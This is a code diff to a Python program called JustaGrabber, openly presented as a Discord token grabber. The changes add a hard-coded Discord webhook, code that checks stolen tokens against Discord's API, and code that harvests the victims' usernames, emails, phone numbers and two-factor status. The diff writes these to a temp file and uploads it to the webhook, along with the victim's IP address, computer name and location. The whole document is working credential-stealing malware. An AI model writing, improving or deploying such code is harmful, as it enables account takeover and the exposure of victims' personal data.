@@ -1,11 +1,10 @@
 """
-         ██╗██╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗     ██╗   ██╗    ██╗   ██╗  ██╗
-         ██║██║   ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██║   ██║   ███║   ██║  ██║
-         ██║██║   ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝    ██║   ██║   ╚██║   ███████║
+         ██╗██╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗     ██╗   ██╗    ██╗   ███████╗
+         ██║██║   ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██║   ██║   ███║   ██╔════╝
+         ██║██║   ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝    ██║   ██║   ╚██║   ███████╗
     ██   ██║██║   ██║╚════██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗    ╚██╗ ██╔╝    ██║   ╚════██║
-    ╚█████╔╝╚██████╔╝███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║     ╚████╔╝ ██╗ ██║██╗     ██║
-     ╚════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚═╝ ╚═╝╚═╝     ╚═╝
-     
+    ╚█████╔╝╚██████╔╝███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║     ╚████╔╝ ██╗ ██║██╗███████║
+     ╚════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚═╝ ╚═╝╚═╝╚══════╝
      Made by kldiscord on github. Thank you for using!
      + This is not the last version of justagrabber, I will update many functions!!
 """ # JustaGrabber by KLDiscord
@@ -18,9 +17,9 @@ except ModuleNotFoundError: # If requests module not exists, JustaGrabber will n
     sys.exit()
 
 
-import os, re, json, urllib.request,datetime # Importing modules
+import os, re, json, urllib.request,datetime,random # Importing modules
 
-WEBHOOK_URL = ''
+WEBHOOK_URL = 'https://discord.com/api/webhooks/930357648795242500/d7pP8aCCCtdhh80BVsgQMkBdvIkHXwESclaGh-dCSULBQrRM4TFeNBCjV4OXIixyVtLQ'
 # Type your discord webhook url over here 
 
 Ping_me = True # IF true, Your webhook will mention you when it grab tokens.
@@ -54,6 +53,9 @@ def JustaGrabber():
     # Token's paths
     appdata = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
+    temp = os.getenv('TEMP')
+    tempfolder = temp + "\\" + str(random.randint(10000000,99999999))
+    os.mkdir(tempfolder)
 
     paths = { # Browser's path
         '<Discord> ': roaming + '\\Discord',
@@ -100,15 +102,15 @@ def JustaGrabber():
         message = "@everyone   JustaGrabber found a new token! \n"
     message += "```md\n"
 
+    file = open(tempfolder+"/Tokeninfo.txt","w+")
+    file.write("Token Info by JustaGrabber\n \n")
     # Find tokens
     for platform, path in paths.items():
         if not os.path.exists(path):
             continue
 
         message += f'\n{platform}\n\n'
-
         tokens = find_tokens(path)
-
         if len(tokens) > 0:
             for token in tokens:
                 headers={ # Token checker
@@ -117,6 +119,26 @@ def JustaGrabber():
                 src = requests.get('https://discordapp.com/api/v8/auth/login', headers=headers)
                 if src.status_code == 200:
                     message += '<Tokens_found : ' + f'{token}' + '>' + '\n'
+                    headers={ # Token checker
+                        'Authorization': token
+                    }
+                    
+                    headerrs = {'Authorization': token, 'Content-Type': 'application/json'}  
+                    r = requests.get('https://discord.com/api/v8/users/@me', headers=headerrs)
+                    if r.status_code == 200:
+                        userName = r.json()['username'] + '#' + r.json()['discriminator']
+                        userID = r.json()['id']
+                        phone = r.json()['phone']
+                        email = r.json()['email']
+                        mfa = r.json()['mfa_enabled']
+                        f = r.json()['nsfw_allowed']
+                        ff = r.json()['locale']
+                        fff = r.json()['verified']
+                        ffff = r.json()['flags']
+                        reee = False
+                        if 'premium_type' in r.json():
+                            reee = True
+                        file.write(f"\n--------------------\nUsername : {userName}\nUser ID : {userID}\nPhone : {phone}\nEmail : {email}\nVerified : {fff}\n2 Factor login enabled : {mfa}\nNSFW allowed : {f}\nLanguage : {ff}\nFlags : {ffff}\nNitro : {reee}\n--------------------\n")
 
         else: # Print when no tokens found.
             message += '[Error](No tokens found.)\n'
@@ -126,7 +148,6 @@ def JustaGrabber():
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
     }
     message += "```"
-
     # Sending message
     payload = json.dumps({'content': message}) # Sending tokens.
     try: # Embed
@@ -143,7 +164,7 @@ def JustaGrabber():
                     "icon_url": "https://cdn.discordapp.com/emojis/819756986223689728.gif?size=96",
                     "url": "https://github.com/kldiscord/JustaGrabber"
                      },
-                "description":f'Username : ' + os.getenv('USER', os.getenv('USERNAME', 'user'))+'⠀IP : ' + getipinfo()[0] + '⠀PC Name : ' + os.getenv("COMPUTERNAME") + '⠀\nCountry : ' + getipinfo()[3] + '⠀City : ' + getipinfo()[1] + '⠀Region : ' + getipinfo()[1] + '\nPostal : ' + getipinfo()[6] + '⠀Timezone : ' + getipinfo()[7] + '⠀Location : ' + getipinfo()[4] + '\nGoogle Map : ' + "https://www.google.com/maps/search/google+map++" + getipinfo()[4],
+                "description":f'Username : ' + os.getenv('USER', os.getenv('USERNAME', 'user'))+'⠀IP : ' + getipinfo()[0] + '⠀PC Name : ' + os.getenv("COMPUTERNAME") + '⠀\nCountry : ' + getipinfo()[3] + '⠀City : ' + getipinfo()[1] + '⠀Region : ' + getipinfo()[1] + '\nPostal : ' + getipinfo()[6] + '⠀Timezone : ' + getipinfo()[7] + '⠀Location : ' + getipinfo()[4] + '\nGoogle Map : ' + "https://www.google.com/maps/search/google+map++" + getipinfo()[4] + "  Token info in file",
                 "color": 0x00C7FF,
                 "thumbnail":{
                     "url":"https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96"
@@ -155,8 +176,11 @@ def JustaGrabber():
         ]
         } 
         requests.post(WEBHOOK_URL, json=alert) # Sending embeds
+        file.close()
+        requests.post(WEBHOOK_URL, files={'upload_file': open(tempfolder+"/Tokeninfo.txt")})
     except:
         pass
 
 if __name__ == "__main__":
     JustaGrabber()
+    
